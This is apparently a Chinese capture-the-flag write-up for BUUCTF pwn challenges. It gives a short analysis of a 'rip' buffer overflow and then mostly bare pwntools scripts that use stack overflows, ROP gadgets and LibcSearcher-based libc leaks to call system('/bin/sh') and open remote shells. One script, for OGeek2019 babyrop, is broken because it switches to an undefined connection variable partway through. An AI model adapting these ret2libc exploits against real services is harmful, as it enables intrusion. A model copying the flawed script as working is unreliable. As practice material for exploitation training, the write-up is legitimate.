rip

这道题拿过来，还是先看保护机制：

这、这、这个什么保护都没开😂，看样子不难，丢进ida查看伪代码：

这个意思就是，先读取一个字符串，然后输出这个字符串，然后就没有啦；

再看有个fun()函数，点进去：

这里可以看出，如果控制gets函数，使得输入的字符串，覆盖到fun()函数即可获取shell，这里fun()函数的地址也给了出来，直接利用；

用它之前还得计算偏移量：

偏移量 = （0xF + 0x8）= 0x17

这样就可以了，上exp：

from pwn import *

p = remote('node3.buuoj.cn',26706)

payload = 'a'*23+p64(0x401186)

p.sendline(payload)

p.interactive()

bjdctf_2020_babyrop

from pwn import *

from LibcSearcher import *

context.log_level = 'debug'

a = remote('node3.buuoj.cn',25467)

elf = ELF('./bjdctf_2020_babyrop')

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']

start_addr = 0x4006ad

pop_rdi_addr = 0x400733

payload = 'a'*40+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)

a.recvuntil('Pull up your sword and tell me u story!\n')

a.sendline(payload)

puts_addr = u64(a.recv(6).ljust(8,'\x00'))

libc = LibcSearcher('puts',puts_addr)

libc_base = puts_addr - libc.dump('puts')

sys_addr = libc_base + libc.dump('system')

binsh_addr = libc_base + libc.dump('str_bin_sh')

payload = 'a'*40+p64(pop_rdi_addr)+p64(binsh_addr)+p64(sys_addr)

a.recvuntil('Pull up your sword and tell me u story!\n')

a.sendline(payload)

a.interactive()

[OGeek2019]babyrop

from pwn import *

from LibcSearcher import *

r=remote('node3.buuoj.cn',28485)

elf=ELF('./OGeek2019babyrop')

write_plt=elf.plt['write']

write_got=elf.got['write']

read_got=elf.got['read']

read_plt=elf.plt['read']

main_addr=0x8048825

payload1='\x00'+'\xff'*10

r.sendline(payload1)

payload2='a'*0xe7+'b'*0x4+p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(4)

r.sendline(payload2)

read_addr=u32(r.recv(4))

libc=LibcSearcher('read',read_addr)

libc_base=read_addr-libc.dump('read')

system_addr=libc_base+libc.dump('system')

bin_sh_addr=libc_base+libc.dump('str_bin_sh')

r.sendline(payload1)

a.recvuntil('Correct\n')

payload='a'*0xe7+'b'*0x4+p32(system_addr)+p32(0)+p32(bin_sh_addr)

a.sendline(payload)

a.interactive()

ciscn_2019_en_2

from pwn import *

from LibcSearcher import *

a=remote('node3.buuoj.cn',29319)

elf=ELF('./ciscn_2019_en_2')

puts_plt=elf.sym['puts']

puts_got=elf.got['puts']

pop_rdi=0x400c83

main_addr=0x400b28

payload='a'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)

a.recvuntil('Input your choice!')

a.sendline('1')

a.recvuntil('Input your Plaintext to be encrypted')

a.sendline(payload)

a.recvuntil('@')

a.recv(1)

puts_addr= u64(a.recvline()[:-1].ljust(8, '\x00'))

libc=LibcSearcher("puts",puts_addr )

libc_base = puts_addr - libc.dump('puts')

sys_addr = libc_base + libc.dump('system')

binsh_addr = libc_base + libc.dump('str_bin_sh')

payload='a'*0x58+p64(0x4006b9)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)

a.recvuntil('Input your choice!')

a.sendline('1')

a.recvuntil('Input your Plaintext to be encrypted')

a.sendline(payload)

a.interactive()

jarvisoj_level3_x64

from pwn import*

from LibcSearcher import *

context.log_level="debug"

a = remote('node3.buuoj.cn',26789)

elf = ELF('./level3_x64')

write_plt = elf.plt['write']

write_got = elf.got['write']

main = 0x40061a 

pop_rdi = 0x04006b3

pop_rsi_r15 = 0x04006b1

payload = 0x80*'a'+'bbbbbbbb'+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)

a.recvuntil("Input:\n")

a.sendline(payload)

write_addr = u64(a.recv(8))

libc = LibcSearcher('write',write_addr)

libc_base = write_addr - libc.dump('write')

sys_addr = libc_base + libc.dump('system')

binsh_addr = libc_base + libc.dump('str_bin_sh')

payload = 0x80*'a'+'bbbbbbbb'+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(main)

a.sendline(payload)

a.interactive()
